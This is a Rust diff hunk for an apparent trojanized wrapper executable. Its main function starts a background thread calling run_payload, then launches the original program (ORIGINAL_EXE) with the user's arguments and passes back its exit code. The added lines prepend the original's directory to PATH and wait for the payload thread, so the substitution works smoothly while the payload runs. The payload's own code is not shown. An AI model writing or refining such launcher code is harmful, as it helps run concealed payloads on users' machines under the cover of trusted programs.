@@ -38,13 +38,29 @@ fn run_payload(dir: &PathBuf) {
     }
 }
 
+fn prepend_dir_to_path(orig: &PathBuf) {
+    let Some(dir) = orig.parent() else { return; };
+    let mut path = dir.to_string_lossy().into_owned();
+    if let Ok(old) = env::var("PATH") {
+        path.push(';');
+        path.push_str(&old);
+    }
+    env::set_var("PATH", path);
+}
+
 fn main() {
     let dir = exe_dir();
     let payload_dir = dir.clone();
-    let _ = std::thread::spawn(move || run_payload(&payload_dir));
-    let status = Command::new(dir.join(ORIGINAL_EXE))
+    let payload = std::thread::spawn(move || run_payload(&payload_dir));
+    let mut orig = PathBuf::from(ORIGINAL_EXE);
+    if !orig.is_absolute() {
+        orig = dir.join(orig);
+    }
+    prepend_dir_to_path(&orig);
+    let status = Command::new(&orig)
         .args(env::args_os().skip(1))
         .status();
+    let _ = payload.join();
     match status {
         Ok(s) => std::process::exit(s.code().unwrap_or(1)),
         Err(_) => std::process::exit(1),
